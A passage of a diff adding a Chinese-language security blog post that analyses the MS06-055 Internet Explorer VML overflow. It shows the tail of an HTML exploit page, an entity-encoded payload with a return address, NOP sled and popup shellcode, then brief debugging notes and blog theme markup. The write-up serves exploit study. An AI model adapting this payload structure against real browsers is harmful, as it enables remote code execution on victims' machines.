class="string">"&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#xcc;&amp;#x9eb8;&amp;#x77e1;&amp;#x9090;&amp;#x9090;&amp;#x9090;&amp;#x9090;&amp;#x68fc;&amp;#xa6a;&amp;#x1e38;&amp;#x6368;&amp;#xd189;&amp;#x684f;&amp;#x7432;&amp;#xc91;&amp;#x8b9;&amp;#x8df4;&amp;#xf47e;&amp;#xdb33;&amp;#x4b7;&amp;#xe32b;&amp;#xbb66;&amp;#x3233;&amp;#x953;&amp;#x7568;&amp;#x6573;&amp;#x5472;&amp;#xd233;&amp;#x8b64;&amp;#x305a;&amp;#x4b8b;&amp;#x8bc;&amp;#x499;&amp;#x8b1c;&amp;#x8b9;&amp;#x869;&amp;#x3dad;&amp;#xa6a;&amp;#x1e38;&amp;#x575;&amp;#x995;&amp;#x57ff;&amp;#x95f8;&amp;#x8b60;&amp;#x3c45;&amp;#x4c8b;&amp;#x785;&amp;#xcd3;&amp;#x598b;&amp;#x209;&amp;#xdd3;&amp;#xff33;&amp;#x8b47;&amp;#xbb34;&amp;#xf53;&amp;#xf99;&amp;#x6be;&amp;#x93a;&amp;#x74c4;&amp;#xc18;&amp;#x7ca;&amp;#xd03;&amp;#xeb46;&amp;#x3bf1;&amp;#x2454;&amp;#x751c;&amp;#xe49;&amp;#x598b;&amp;#x324;&amp;#x66dd;&amp;#x3c8b;&amp;#x8b7b;&amp;#x1c59;&amp;#xdd3;&amp;#x93;&amp;#xbb2c;&amp;#x5f95;&amp;#x57ab;&amp;#x3d61;&amp;#xa6a;&amp;#x1e38;&amp;#xa975;&amp;#xdb33;&amp;#x539;&amp;#x7468;&amp;#x7365;&amp;#x6874;&amp;#x696d;&amp;#x6978;&amp;#xc48b;&amp;#x5053;&amp;#x950;&amp;#xff53;&amp;#xfc57;&amp;#xff53;&amp;#xf857;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">v:rect</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">v:fill</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>调试可以看到函数返回后到jmp esp的位置，再进一步进入shellcode地区：</p>
+<p><img src="/2020/04/27/MS06-055/dbg2.JPG" alt></p>
+<p><img src="/2020/04/27/MS06-055/dbg3.JPG" alt></p>
+<p>进一步走得出弹窗：</p>
+<p><img src="/2020/04/27/MS06-055/success2.JPG" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/26/ms08-067%E5%88%86%E6%9E%90/" rel="next" title="ms08-067分析">
+                <i class="fa fa-chevron-left"></i> ms08-067分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#动态分析"><span class="nav-number">2.</span> <span class="nav-text">动态分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
